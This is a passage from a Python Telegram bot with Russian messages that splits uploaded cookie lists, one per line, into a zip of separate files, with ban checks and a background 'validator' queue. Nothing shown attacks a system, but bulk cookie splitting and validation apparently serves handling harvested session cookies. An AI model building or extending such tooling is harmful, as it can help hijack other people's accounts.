        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.answer(
        f"✂️ <b>РАЗДЕЛЕНИЕ КУКОВ ИЗ ФАЙЛА</b>\n"
        f"\n"
        
        f"1. <b>Подготовьте файл с куками (.txt)</b>\n"
        f"2. <b>Отправьте файл в этот чат</b>\n\n"
        
        f"📁 <b>Требования:</b>\n"
        f"├ Только текстовый формат (.txt)\n"
        f"├ Каждая кука на новой строке\n"
        f"└ Максимальный размер: 20MB\n\n"
        
        f"<i>«Жду ваш файл»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.cookie_splitter)

@router.callback_query(F.data == "split_message")
async def split_message_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.answer(
        f"✂️ <b>РАЗДЕЛЕНИЕ КУКОВ ИЗ СООБЩЕНИЯ</b>\n"
        f"\n"
        
        f"1. <b>Отправьте куки в чат</b>\n"
        f"2. <b>Каждую куку на новой строке</b>\n\n"
        
        f"📋 <b>Формат:</b>\n"
        f"├ Одна кука на одну строку\n"
        f"└ Например: cookie1 на строке 1, cookie2 на строке 2\n\n"
        
        f"<i>«Отправьте куки для разделения»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.cookie_splitter)

@router.message(Form.cookie_splitter)
async def process_cookie_splitter(message: Message, state: FSMContext):
    """Обрабатывает разделение кук из файла или сообщения"""
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        await state.clear()
        return
    
    cookies_list = []
    msg = None
    
    try:
        # Обработка файла
        if message.document:
            file_id = message.document.file_id
            file_name = f"{random.randint(100000, 999999)}.txt"
            file_path = f"{COOKIE_FILES_DIR}{file_name}"
            
            msg = await message.answer("📥 <b>Скачиваю файл...</b>", parse_mode=ParseMode.HTML)
            await bot.download(file_id, destination=file_path)
            
            with open(file_path, 'r', encoding='utf-8') as f:
                cookies_list = [line.strip() for line in f if line.strip()]
            
            os.remove(file_path)
            
        # Обработка текста из сообщения
        elif message.text:
            cookies_list = [line.strip() for line in message.text.split('\n') if line.strip()]
        else:
            await message.answer(
                f"❌ <b>ОШИБКА</b>\n\n"
                f"📤 Пожалуйста, отправьте файл или текст с куками",
                parse_mode=ParseMode.HTML
            )
            return
        
        if not cookies_list:
            if msg:
                await msg.edit_text(
                    f"❌ <b>ОШИБКА</b>\n\n"
                    f"🚫 Не найдено кук для разделения",
                    parse_mode=ParseMode.HTML
                )
            else:
                await message.answer(
                    f"❌ <b>ОШИБКА</b>\n\n"
                    f"🚫 Не найдено кук для разделения",
                    parse_mode=ParseMode.HTML
                )
            return
        
        # Создаем архив с отдельными файлами кук
        if msg:
            await msg.edit_text(f"⏳ <b>Разделяю {len(cookies_list):,} кук...</b>", parse_mode=ParseMode.HTML)
        else:
            msg = await message.answer(f"⏳ <b>Разделяю {len(cookies_list):,} кук...</b>", parse_mode=ParseMode.HTML)
        
        # Создаем временную папку
        temp_dir = f"{COOKIE_FILES_DIR}split_{random.randint(100000, 999999)}/"
        os.makedirs(temp_dir, exist_ok=True)
        
        # Сохраняем каждую куку в отдельный файл
        for idx, cookie in enumerate(cookies_list, 1):
            file_path = f"{temp_dir}cookie_{idx}.txt"
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(cookie)
        
        # Создаем архив
        archive_name = f"{COOKIE_FILES_DIR}cookies_split_{random.randint(100000, 999999)}.zip"
        shutil.make_archive(archive_name[:-4], 'zip', temp_dir)
        
        # Очищаем временную папку
        shutil.rmtree(temp_dir)
        
        # Отправляем архив
        await msg.edit_text(
            f"✅ <b>ГОТОВО!</b>\n"
            f"\n"
            f"📊 <b>Статистика разделения:</b>\n"
            f"├ Всего кук: <code>{len(cookies_list):,}</code>\n"
            f"├ Размер архива: <code>{os.path.getsize(archive_name) / 1024 / 1024:.2f} MB</code>\n"
            f"└ Формат: <code>.zip</code>\n\n"
            f"📥 <b>Архив готов к скачиванию</b>\n"
            f"══════════════════════════",
            parse_mode=ParseMode.HTML
        )
        
        # Отправляем файл
        await message.answer_document(FSInputFile(archive_name))
        
        # Удаляем архив
        os.remove(archive_name)
        
        await state.clear()
        
    except Exception as e:
        if msg:
            await msg.edit_text(
                f"❌ <b>ОШИБКА РАЗДЕЛЕНИЯ</b>\n\n"
                f"<code>{str(e)[:100]}</code>",
                parse_mode=ParseMode.HTML
            )
        else:
            await message.answer(
                f"❌ <b>ОШИБКА РАЗДЕЛЕНИЯ</b>\n\n"
                f"<code>{str(e)[:100]}</code>",
                parse_mode=ParseMode.HTML
            )
        logging.error(f"Cookie splitter error: {e}")
        await state.clear()

@router.message()
async def check_ban(message: Message):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(
            f"🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>\n"
            f"\n"
            f"📝 <b>Причина блокировки:</b>\n<code>{reason}</code>\n\n"
            ,
            parse_mode=ParseMode.HTML
        )
        return
    
    await bot.send_sticker(message.chat.id, STICKERS['error'])
    await message.answer(
        f"❌ <b>НЕИЗВЕСТНАЯ КОМАНДА</b>\n"
        f"📝 <b>Используйте /start для начала работы с ботом.</b>\n\n"
        f"<i>Или выберите действие из меню.</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=get_main_keyboard()
    )

async def main():
    await Database.send_startup_message()
    
    
    global queue_task, validator_task
    queue_task = asyncio.create_task(process_queue())
    active_tasks.add(queue_task)
    
    validator_task = asyncio.create_task(process_validator_queue())
    validator_active_tasks.add(validator_task)
    
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler("bot.log"),
            logging.StreamHandler()
        ]
    )
    
    logging.info("Запуск бота...")

    asyncio.run(main())
